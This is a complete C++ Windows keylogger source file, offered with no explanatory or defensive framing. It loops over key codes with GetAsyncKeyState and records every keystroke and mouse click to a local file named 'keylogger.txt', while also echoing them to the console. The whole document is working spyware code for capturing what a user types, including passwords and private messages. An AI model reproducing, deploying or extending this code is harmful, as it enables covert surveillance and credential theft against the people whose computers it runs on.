#include <iostream>
#include <fstream>
#include <Windows.h>

void log(LPCSTR text) {
    std::ofstream logfile;
    logfile.open("keylogger.txt", std::fstream::app);
    logfile << text;
    logfile.close();
}
bool keyIsListed(int iKey) {
    switch(iKey) {
        case VK_SPACE:  
            std::cout << " ";
            log(" ");
            break;
        case VK_RETURN:
            std::cout << "\n";
            log("\n");
            break;
        case VK_SHIFT:
            std::cout << " shift ";
            log(" shift \n");
            break;
        case VK_BACK:
            std::cout << "\b";
            log("\b");
            break;
        case VK_RBUTTON:
            std::cout << "rclick";
            log("rclick\n");
            break;
        case VK_LBUTTON:
            std::cout << "lclick";
            log("lclick\n");
            break;
        default: 
            return false;
    }
    return true;
}
int main() {
    char key; 
    while(true) {
        for (key = 8; key <= 200; key++)
            if (GetAsyncKeyState(key) == -32767) {
                if (!keyIsListed(key)) {
                    std::ofstream logfile;
                    logfile.open("keylogger.txt", std::fstream::app);
                    logfile << key;
                    logfile.close();
                }
            }
    }
}